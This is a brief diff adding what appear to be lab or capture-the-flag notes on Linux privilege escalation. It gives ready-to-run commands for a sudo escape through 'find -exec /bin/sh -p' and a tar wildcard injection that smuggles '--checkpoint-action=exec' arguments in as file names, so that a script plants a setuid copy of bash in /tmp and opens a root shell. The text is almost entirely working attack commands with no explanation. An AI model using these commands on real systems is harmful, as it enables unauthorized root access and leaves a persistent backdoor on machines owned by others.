@@ -1,0 +1,11 @@
+Phase 1: Sudo Escape
+Path: /usr/bin/find
+Command: sudo find . -exec /bin/sh -p \; -quit
+
+Phase 3: Wildcard Injection
+Path: /home/limited_user/backups
+Commands:
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh
+touch ./"--checkpoint=1"
+touch ./"--checkpoint-action=exec=sh runme.sh"
+/tmp/rootbash -p
